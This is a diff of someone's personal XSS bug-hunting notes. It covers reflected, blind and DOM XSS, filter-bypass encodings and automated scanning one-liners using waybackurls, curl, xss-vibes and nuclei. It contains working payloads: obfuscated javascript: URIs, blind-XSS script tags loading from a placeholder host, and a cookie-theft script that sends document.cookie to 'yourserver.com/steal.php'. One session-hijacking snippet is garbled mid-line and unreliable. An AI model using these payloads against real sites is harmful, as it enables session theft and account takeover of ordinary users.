@@ -1,5 +1,12 @@
 
+
 Xss
+check for xss cheatsheat
+
+<iframe src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aalert(0)">
+
+
+
 REFLECTED
 1)
 Use Gau or Wayback urls to passively gather urls of the target.
@@ -243,6 +250,8 @@ test@gmail.com%27\%22%3E%3Csvg/onload=alert(/xss/)%3E
       
 
 url encoding of payload 
+
+
 `%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%27%58%53%53%27%29%3C%2F%73%63%72%69%70%74%3E`    
 
 Hex encoding of payload
@@ -264,6 +273,18 @@ Base64 Encoding + Unicode Encoding:  and
 
 combination of all technique 
 
+BYPASSING XSS FILTERS
+
+&#60;script&#62;alert(1)&#60;/script&#62;
+
+%3Cscript%3Ealert(1)%3C/script%3E       if the filter only works for plain text string
+
+\\x3cscript\\x3ealert(1)\\x3c/script\\x3e            if filter only looks for alphabatical string
+
+\\u003cscript\\u003ealert(1)\\u003c/script\\u003e        if the filter looks for ASCII strings
+
+%26#x6c;t;\\x73cript&#62;\\u0061lert(1)%26#x6c;t;/\\x73cript&#62;
+
 
 Blind XSS
 Use burpcollaborator or ngrok
@@ -277,7 +298,17 @@ Use burpcollaborator or ngrok
 7- Log Viewers
 8- Feedback Page
 9- Chat Applications
-10- Any app that requires user moderation
+10- Any app that requires user moderation          
+
+  stepss when hunting for bliind xss in an e-commerce website
+     when filling out forms allows sticks with the src tag andalso make alot of assumption
+     name :   '"://></script></script/src=http://url.com/      remember to change url parameter, shpould in case url is been filltered 
+     <input data = ""/><script/src=//"..."></script>
+      strick on the delivery not or any input field
+      
+     "'"/></textarea></script/script><script/src=https://url.com/              check for proxy and place ypur payload proxy replace field this is notifty when you xss are been fired 
+
+
 
             DOM XSS
 Tips
@@ -289,7 +320,7 @@ www.gap.com/email?message=<script>alert("hi")</script>
 
      
      Tips to find DOM XSS: ⚡️🔥
-
+ never use source while testing for dom xss
 1. Start Burpsuite Community Edition 
 2. Click on Open Browser 
 3. Go and click on the Burp icon in extension tab on browser 
@@ -302,10 +333,21 @@ www.gap.com/email?message=<script>alert("hi")</script>
 10. Click it to get Dom XSS poc 
 11. If doesn’t work, repeat the same on different url, functionality. 
 
+/////////
+ if string enters in double qoute, we might break out by using double qoute
+ REMEMBER
+ if you data get url- encoded before being processed, it is unlikely an xss will work
+
+   
+
+
 ///
 eval(alert(document.domain))
 location.hash       https://oldnavy.gap.com/#test          change the string ? to # if empty
-location.search
+location.search   .... place a random value into it
+  example
+  https://www.gogle.com/submit.thml?email=sdddhhhd
+  it would return ?email=sdddhhhd
 
 window.location.hash.slice(1)
 
@@ -350,7 +392,11 @@ Change the user’s security questions
  
  session hijacking payload  on an form 
  <script>
-var sessionId = document.cookie.match(/sessionId=(.*?)(;|$)/)[1]
+var sessionId = document.
+
+
+
+ie.match(/sessionId=(.*?)(;|$)/)[1]
 </script>
 
 payload for a data theft using xss
@@ -360,7 +406,14 @@ var stolenCookies = document.cookie;
 var xhr = new XMLHttpRequest();
 xhr.open('GET', 'https://yourserver.com/steal.php?data=' + encodeURIComponent(stolenCookies), true);
 xhr.send();
-</script>
+</script>       
+
+
+java%0d%0ascript%0d%0a:alert(0) 
+ j%0d%0aava%0d%0aas%0d%0acrip%0d%0at%0d%0a:confirm`0` 
+ java%07script:prompt`0` 
+ java%09scrip%07t:prompt`0` 
+ jjavascriptajavascriptvjavascriptajavascriptsjavascriptcjavascriptrjavascriptijavascript pjavascriptt:confirm`0`
 
 
 ($$ \unicode{<img src=1 onerror=alert(1)>} $$) 
@@ -436,3 +489,27 @@ To compensate for this, you can attach an event listener to the document which w
     Find the parameters which are not filtering special characters - One Liner
      echo "test.url" | waybackurls | grep "=" | tee waybackurls.txt
 cat waybackruls | egrep -iv ".(jpg|jpeg|js|css|gif|tif|tiff|png|woff|woff2|ico|pdf|svg|txt)" | qsreplace '"><()'| tee combinedfuzz.json && cat combinedfuzz.json | while read host do ; do curl --silent --path-as-is --insecure "$host" | grep -qs "\"><()" && echo -e "$host \033[91m Vullnerable \e[0m \n" || echo -e "$host  \033[92m Not Vulnerable \e[0m \n"; done | tee XSS.txt
+
+
+
+     USING XSS-VIBES    check docs
+     first test for dangerous charaters .. this involves =batman" in url links and check if it is reflected in , if reflected, apply some apyload 
+     on xss-vibes directory
+     katana -u "url" -o katana.txt
+      python3 main.py -f katana.txt -o xss_vibes.txt
+       python3 main.py -f katana.txt -o --waf                  // to dectect if there is web application firwall
+      python3 main.py -f katana.txt -w cloudflare -t 5        //specify the firewall
+     
+     
+     
+     adding payload on xss-vibes
+     $ python3 added.py -p "payload"
+      $ python3 added.py -p "payload"  -w cloudflare
+      $ python3 added.py -f payload.txt -w  wordfence                adding a payload with filename and also speciflying the name 
+     
+     USING MY NUCLEI TEMPLET FOR XSS 
+     nuclei -l url.txt -t xss.yml                   this is on my desktop/tool
+     
+     
+     https://brutelogic.com.br/poc.svg // this is url for xss
+     
